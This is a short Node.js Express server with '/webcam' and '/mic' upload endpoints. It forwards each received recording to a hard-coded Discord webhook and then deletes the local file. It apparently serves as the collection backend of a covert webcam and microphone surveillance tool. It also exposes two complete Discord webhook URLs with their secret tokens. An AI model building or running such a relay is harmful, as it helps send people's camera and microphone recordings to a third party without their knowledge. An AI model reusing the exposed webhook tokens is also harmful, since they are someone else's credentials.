const express = require('express');
const multer = require('multer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();

const upload = multer({ dest: 'uploads/' });

const WEBHOOKS = {
  webcam: 'https://discord.com/api/webhooks/1397175042194014382/yNCyJ-3LAZqP62LGsct3Z8z9Ag0ztHnEeCS7tkvH-bgXU-Iai0-Xl-MP-Zb0gYfJCVLD',
  mic: 'https://discord.com/api/webhooks/1397177042608586753/lCqYCpPeaf9vhD5qTk2b1TXBFS8rANga2EX9rsbDlpSg6DM5i7QyiZv2jWsxw7hFEeDT'
};

async function forwardFile(req, res, type) {
  const filePath = path.join(__dirname, req.file.path);
  const form = new FormData();
  form.append('file', fs.createReadStream(filePath));

  try {
    await axios.post(WEBHOOKS[type], form, { headers: form.getHeaders() });
    fs.unlinkSync(filePath);
    res.sendStatus(200);
  } catch (err) {
    console.error(`❌ Upload error:`, err.message);
    res.sendStatus(500);
  }
}

app.post('/webcam', upload.single('file'), (req, res) => forwardFile(req, res, 'webcam'));
app.post('/mic', upload.single('file'), (req, res) => forwardFile(req, res, 'mic'));

app.listen(3000, () => console.log('✅ Server running on port 3000'));
